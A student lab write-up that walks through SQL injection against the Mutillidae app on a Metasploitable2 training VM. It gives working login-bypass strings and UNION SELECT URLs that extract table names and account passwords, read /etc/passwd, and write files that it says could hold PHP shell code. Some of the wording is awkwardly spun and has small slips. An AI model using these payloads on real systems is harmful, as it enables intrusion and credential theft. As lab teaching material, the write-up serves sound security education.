# sqlinjection
Exploiting SQL Injection vulnerability.

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![ethical1 1](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/6b990826-ffbd-450c-8fa5-9e6331a816b0)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![ethical2](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/0d0988e8-c3cc-4170-84c8-80e54d9ace4e)

Click on the menu Login/Register and register for an account

![ethical3](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/f17451b1-03b1-455f-8e8f-0b3999866c96)


Click on the link “Please register here”
![ethical4](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/7052031d-08db-4ee8-9155-aa2695e9c341)

Click on “Create Account” to display the following page:
![ethical5](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/f937f002-802d-43d1-9438-d69670c46ffa)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “praveen” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![ethical6](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/cf0a18c6-4b8d-47dd-86e1-ed97673e98ff)


Click “Login”. The logged in page will show as below:
![ethical7](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/2286b3dd-f34b-4992-a7dc-bcacc47d85ce)




##Bypassing login field

The username field is vulnerable. Put (praveen’ #) or (praveen’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “praveen.”

Now after logging out you will see the login page. In the login page give praveen’ # . You can see the page now enters into the administrator page as before when giving the password. 

![ethical8](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/372f312d-5a92-4eaf-a003-01dd7f798d9d)


Click the login button and you will see it enter into the administrator page.

![ethical9](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/5f3af20f-9437-4529-af28-0936475dab3e)


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![ethical10](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/e9f3c972-5993-4f31-8546-270e5340aa1a)


![ethical11](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/f16b12ad-5bf7-4e66-9ff8-a2471375aa12)


![ethical12](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/41734882-32c4-4cc6-8a0a-a0361a33f634)

![ethical13](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/03df604b-345b-4774-a06d-144892f7e3c7)

![ethical14](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/9fc5637f-40dc-4edb-bd6c-8fa3deac5af9)



From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![Screenshot 2023-06-10 224702](https://github.com/praveenst13/sqlinjection/assets/118787793/10c8f015-3770-46b5-b320-bf37cc7bbdae)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


![Screenshot 2023-06-10 224839](https://github.com/praveenst13/sqlinjection/assets/118787793/0eb340b9-63a6-433e-878b-45f3b396f1a2)

After adding the order by 6 into the existing url , the following error statement will be obtained:
![Screenshot 2023-06-10 224839](https://github.com/praveenst13/sqlinjection/assets/118787793/0eb340b9-63a6-433e-878b-45f3b396f1a2)



When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![Screenshot 2023-06-10 224928](https://github.com/praveenst13/sqlinjection/assets/118787793/86073e2f-937b-47a4-9b9d-c0c2863b2a7c)


 As it is having 5 columns the query worked fine and it provides the correct result


![Screenshot 2023-06-10 224939](https://github.com/praveenst13/sqlinjection/assets/118787793/7a660480-5cb6-4d86-acd1-08f7a4d5e2fa)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![Screenshot 2023-06-10 225037](https://github.com/praveenst13/sqlinjection/assets/118787793/1c7ac260-3410-4f75-8091-2cda6b7f20c0)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![Screenshot 2023-06-10 225105](https://github.com/praveenst13/sqlinjection/assets/118787793/12ebac90-8efb-4558-a442-541029220fa3)
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details



![Screenshot 2023-06-10 225314](https://github.com/praveenst13/sqlinjection/assets/118787793/78ba6fc7-7ab6-4c39-8a7f-c8e4240775b8)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2023-06-10 225407](https://github.com/praveenst13/sqlinjection/assets/118787793/68ccd33b-a98d-4ff6-8c19-57e63c2724d0)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.




![Screenshot 2023-06-10 225659](https://github.com/praveenst13/sqlinjection/assets/118787793/c820f87a-30cb-485b-b423-f6fd0e67c96e)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![Screenshot 2023-06-10 225659](https://github.com/praveenst13/sqlinjection/assets/118787793/c820f87a-30cb-485b-b423-f6fd0e67c96e)





Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2023-06-10 225759](https://github.com/praveenst13/sqlinjection/assets/118787793/f7dd79fb-c11c-41f3-8019-06685e9cd759)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2023-06-10 225846](https://github.com/praveenst13/sqlinjection/assets/118787793/13f4a113-06fc-4d62-a8ec-6525c4ec1343)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).




## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.

